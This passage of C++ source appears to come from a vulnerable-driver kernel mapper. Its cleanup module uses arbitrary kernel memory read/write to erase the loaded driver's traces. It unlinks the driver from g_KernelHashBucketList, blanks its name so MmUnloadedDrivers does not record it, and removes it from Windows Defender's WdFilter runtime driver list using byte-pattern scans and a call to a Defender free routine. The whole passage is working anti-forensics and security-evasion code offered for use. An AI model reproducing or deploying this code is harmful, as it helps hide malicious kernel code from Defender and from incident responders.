	wchar_t driverPath[ MAX_PATH * 2 ] {};
	if ( !BuildMapperDriverPathW( driverPath, _countof( driverPath ) ) )
	{
		KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
		return 8;
	}

	std::wstring searchPath( driverPath );
	const SIZE_T expectedLen = ( searchPath.length( ) - 2 ) * 2;
	const auto driverName = GetVulnerableDriverNameW( );

	while ( entry )
	{
		USHORT nameLen = 0;

		if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry ) + offsetof( HashBucketEntry, DriverName.Length ), &nameLen, sizeof( nameLen ) ) || !nameLen )
		{
			KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
			return 9;
		}

		if ( expectedLen == nameLen )
		{
			wchar_t* namePtr = nullptr;

			if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry ) + offsetof( HashBucketEntry, DriverName.Buffer ), &namePtr, sizeof( namePtr ) ) || !namePtr )
			{
				KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
				return 10;
			}

			auto wsName = std::make_unique<wchar_t[ ]>( s_cast<size_t>( nameLen ) / 2 + 1 );

			if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( namePtr ), wsName.get( ), nameLen ) )
			{
				KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
				return 11;
			}

			if ( std::wstring( wsName.get( ) ).find( driverName ) != std::wstring::npos )
			{
				LOG_SEC( "[+] - [Clean] Found in g_KernelHashBucketList: %ws", wsName.get( ) );

				HashBucketEntry* next = nullptr;

				if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry ), &next, sizeof( next ) ) )
				{
					KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
					return 12;
				}

				if ( !KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( prev ), &next, sizeof( next ) ) )
				{
					KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
					return 13;
				}

				if ( !backend.FreePool( r_cast<uint64_t>( entry ) ) )
				{
					KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
					return 14;
				}

				LOG_SEC( "[+] - [Clean] g_KernelHashBucketList cleaned" );
				KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
				return 0;
			}
		}

		prev = entry;

		if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry ), &entry, sizeof( entry ) ) )
		{
			KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
			return 15;
		}
	}

	KernelCleanImpl::ExReleaseResourceLite( backend, g_HashCacheLock );
	return 16;
}

std::uint32_t KernelClean::ClearMmUnloadedDrivers( KernelRwCallBackend& backend )
{
	ULONG bufferSize = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation( static_cast<SYSTEM_INFORMATION_CLASS>( SystemExtendedHandleInformation ), buffer, bufferSize, &bufferSize );

	while ( status == STATUS_INFO_LENGTH_MISMATCH )
	{
		if ( buffer )
			VirtualFree( buffer, 0, MEM_RELEASE );

		buffer = VirtualAlloc( nullptr, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
		status = NtQuerySystemInformation( static_cast<SYSTEM_INFORMATION_CLASS>( SystemExtendedHandleInformation ), buffer, bufferSize, &bufferSize );
	}

	if ( !NT_SUCCESS( status ) || !buffer )
	{
		if ( buffer )
			VirtualFree( buffer, 0, MEM_RELEASE );

		LOG_SEC( "[-] - [Clean] NtQuerySystemInformation failed" );
		return 1;
	}

	uint64_t object = 0;
	auto handleInfo = r_cast<PSYSTEM_HANDLE_INFORMATION_EX>( buffer );

	for ( ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; ++i )
	{
		const auto& current = handleInfo->Handles[ i ];

		if ( current.UniqueProcessId != s_cast<ULONG_PTR>( GetCurrentProcessId( ) ) )
			continue;

		if ( r_cast<HANDLE>( current.HandleValue ) == backend.m_Device )
		{
			object = r_cast<uint64_t>( current.Object );
			break;
		}
	}

	VirtualFree( buffer, 0, MEM_RELEASE );

	if ( !object )
	{
		LOG_SEC( "[-] - [Clean] Device object not found in handle table" );
		return 2;
	}

	uint64_t deviceObject = 0;

	if ( !KernelCleanImpl::ReadMemory( backend, object + 0x8, &deviceObject, sizeof( deviceObject ) ) || !deviceObject )
	{
		LOG_SEC( "[-] - [Clean] Failed to find device_object" );
		return 3;
	}

	uint64_t driverObject = 0;

	if ( !KernelCleanImpl::ReadMemory( backend, deviceObject + 0x8, &driverObject, sizeof( driverObject ) ) || !driverObject )
	{
		LOG_SEC( "[-] - [Clean] Failed to find driver_object" );
		return 4;
	}

	uint64_t driverSection = 0;

	if ( !KernelCleanImpl::ReadMemory( backend, driverObject + 0x28, &driverSection, sizeof( driverSection ) ) || !driverSection )
	{
		LOG_SEC( "[-] - [Clean] Failed to find driver_section" );
		return 5;
	}

	UNICODE_STRING driverBaseDllName {};

	if ( !KernelCleanImpl::ReadMemory( backend, driverSection + 0x58, &driverBaseDllName, sizeof( driverBaseDllName ) ) || !driverBaseDllName.Length )
	{
		LOG_SEC( "[-] - [Clean] Failed to read driver name" );
		return 6;
	}

	auto unloadedName = std::make_unique<wchar_t[ ]>( s_cast<size_t>( driverBaseDllName.Length ) / 2 + 1 );

	if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( driverBaseDllName.Buffer ), unloadedName.get( ), driverBaseDllName.Length ) )
	{
		LOG_SEC( "[-] - [Clean] Failed to read driver name buffer" );
		return 7;
	}

	driverBaseDllName.Length = 0;

	if ( !KernelCleanImpl::WriteMemory( backend, driverSection + 0x58, &driverBaseDllName, sizeof( driverBaseDllName ) ) )
	{
		LOG_SEC( "[-] - [Clean] Failed to write driver name length" );
		return 8;
	}

	LOG_SEC( "[+] - [Clean] MmUnloadedDrivers cleaned: %ws", unloadedName.get( ) );
	return 0;
}

std::uint32_t KernelClean::ClearWdFilterDriverList( KernelRwCallBackend& backend )
{
	const auto WdFilter = GetKernelModuleAddressByName( pstra( "WdFilter.sys" ) );

	if ( !WdFilter )
	{
		LOG_SEC( "[+] - [Clean] WdFilter.sys not loaded, skipped" );
		return 0;
	}

	auto RuntimeDriversList = backend.FindPatternInSection( pstra( "PAGE" ), WdFilter,
		"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", pstra( "xxx????xx" ) );

	if ( !RuntimeDriversList )
	{
		LOG_SEC( "[!] - [Clean] Failed to find WdFilter RuntimeDriversList" );
		return 1;
	}

	auto RuntimeDriversCountRef = backend.FindPatternInSection( pstra( "PAGE" ), WdFilter,
		"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", pstra( "xx????xxx" ) );

	if ( !RuntimeDriversCountRef )
	{
		LOG_SEC( "[!] - [Clean] Failed to find WdFilter RuntimeDriversCount" );
		return 2;
	}

	auto MpFreeDriverInfoExRef = backend.FindPatternInSection( pstra( "PAGE" ), WdFilter,
		"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", pstra( "xxx?x?xx???????????x" ) );

	if ( !MpFreeDriverInfoExRef )
	{
		MpFreeDriverInfoExRef = backend.FindPatternInSection( pstra( "PAGE" ), WdFilter,
			"\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", pstra( "xxx?xx?x???????????x" ) );

		if ( !MpFreeDriverInfoExRef )
		{
			LOG_SEC( "[!] - [Clean] Failed to find WdFilter MpFreeDriverInfoEx" );
			return 3;
		}

		LOG_SEC( "[+] - [Clean] Found WdFilter MpFreeDriverInfoEx with second pattern" );
	}

	MpFreeDriverInfoExRef += 0x7;

	RuntimeDriversList = backend.ResolveRelativeAddress( RuntimeDriversList, 3, 7 );
	const uint64_t RuntimeDriversListHead = RuntimeDriversList - 0x8;
	const uint64_t RuntimeDriversCount = backend.ResolveRelativeAddress( RuntimeDriversCountRef, 2, 6 );
	uint64_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	KernelCleanImpl::ReadMemory( backend, RuntimeDriversArray, &RuntimeDriversArray, sizeof( RuntimeDriversArray ) );
	const uint64_t MpFreeDriverInfoEx = backend.ResolveRelativeAddress( MpFreeDriverInfoExRef, 1, 5 );

	const auto driverName = GetVulnerableDriverNameW( );

	auto ReadListEntry = [ &backend ]( uint64_t address ) -> LIST_ENTRY*
	{
		LIST_ENTRY* entry = nullptr;
		if ( !KernelCleanImpl::ReadMemory( backend, address, &entry, sizeof( LIST_ENTRY* ) ) )
			return nullptr;
		return entry;
	};

	for ( LIST_ENTRY* entry = ReadListEntry( RuntimeDriversListHead );
		entry != r_cast<LIST_ENTRY*>( RuntimeDriversListHead );
		entry = ReadListEntry( r_cast<uint64_t>( entry ) + offsetof( LIST_ENTRY, Flink ) ) )
	{
		UNICODE_STRING unicodeString {};

		if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( entry ) + 0x10, &unicodeString, sizeof( unicodeString ) ) )
			continue;

		auto imageName = std::make_unique<wchar_t[ ]>( s_cast<size_t>( unicodeString.Length ) / 2 + 1 );

		if ( !KernelCleanImpl::ReadMemory( backend, r_cast<uint64_t>( unicodeString.Buffer ), imageName.get( ), unicodeString.Length ) )
			continue;

		if ( wcsstr( imageName.get( ), driverName.c_str( ) ) )
		{
			bool removedFromArray = false;
			const auto sameIndexList = r_cast<PVOID>( r_cast<uint64_t>( entry ) - 0x10 );

			for ( int k = 0; k < 256; k++ )
			{
				PVOID value = nullptr;
				KernelCleanImpl::ReadMemory( backend, RuntimeDriversArray + ( k * 8 ), &value, sizeof( PVOID ) );

				if ( value == sameIndexList )
				{
					PVOID emptyVal = r_cast<PVOID>( RuntimeDriversCount + 1 );
					KernelCleanImpl::WriteMemory( backend, RuntimeDriversArray + ( k * 8 ), &emptyVal, sizeof( PVOID ) );
					removedFromArray = true;
					break;
				}
			}

			if ( !removedFromArray )
			{
				LOG_SEC( "[!] - [Clean] Failed to remove from RuntimeDriversArray" );
				return 4;
			}

			auto nextEntry = ReadListEntry( r_cast<uint64_t>( entry ) + offsetof( LIST_ENTRY, Flink ) );
			auto prevEntry = ReadListEntry( r_cast<uint64_t>( entry ) + offsetof( LIST_ENTRY, Blink ) );

			KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( nextEntry ) + offsetof( LIST_ENTRY, Blink ), &prevEntry, sizeof( PVOID ) );
			KernelCleanImpl::WriteMemory( backend, r_cast<uint64_t>( prevEntry ) + offsetof( LIST_ENTRY, Flink ), &nextEntry, sizeof( PVOID ) );

			ULONG current = 0;
			KernelCleanImpl::ReadMemory( backend, RuntimeDriversCount, &current, sizeof( ULONG ) );
			current--;
			KernelCleanImpl::WriteMemory( backend, RuntimeDriversCount, &current, sizeof( ULONG ) );

			const uint64_t driverInfo = r_cast<uint64_t>( entry ) - 0x20;

			USHORT magic = 0;
			KernelCleanImpl::ReadMemory( backend, driverInfo, &magic, sizeof( USHORT ) );

			if ( magic != 0xDA18 )
			{
				LOG_SEC( "[!] - [Clean] DriverInfo Magic invalid, skipping free" );
			}
			else
			{
				backend.CallKernelFunction<void>( nullptr, MpFreeDriverInfoEx, driverInfo );
			}

			LOG_SEC( "[+] - [Clean] WdFilterDriverList cleaned: %ws", imageName.get( ) );
			return 0;
		}
	}

	return 5;
}

bool KernelClean::RunAllCleanups( KernelRwCallBackend& backend )
{
	std::uint32_t nClearPiDDBCacheTableResult = ClearPiDDBCacheTableManual( backend );
	std::uint32_t nClearKernelHashBucketListResult = ClearKernelHashBucketList( backend );
	std::uint32_t nClearMmUnloadedDriversResult = ClearMmUnloadedDrivers( backend );
	std::uint32_t nClearWdFilterDriverListResult = ClearWdFilterDriverList( backend );

	if ( nClearPiDDBCacheTableResult )
		LOG_SEC( "[-] - [Clean] ClearPiDDBCacheTable failed with code: %u", nClearPiDDBCacheTableResult );

	if ( nClearKernelHashBucketListResult )
		LOG_SEC( "[-] - [Clean] ClearKernelHashBucketList failed with code: %u", nClearKernelHashBucketListResult );

	if ( nClearMmUnloadedDriversResult )
		LOG_SEC( "[-] - [Clean] ClearMmUnloadedDrivers failed with code: %u", nClearMmUnloadedDriversResult );

	if ( nClearWdFilterDriverListResult )
		LOG_SEC( "[-] - [Clean] ClearWdFilterDriverList failed with code: %u", nClearWdFilterDriverListResult );

	return nClearPiDDBCacheTableResult == 0 && nClearKernelHashBucketListResult == 0 && nClearMmUnloadedDriversResult == 0;
}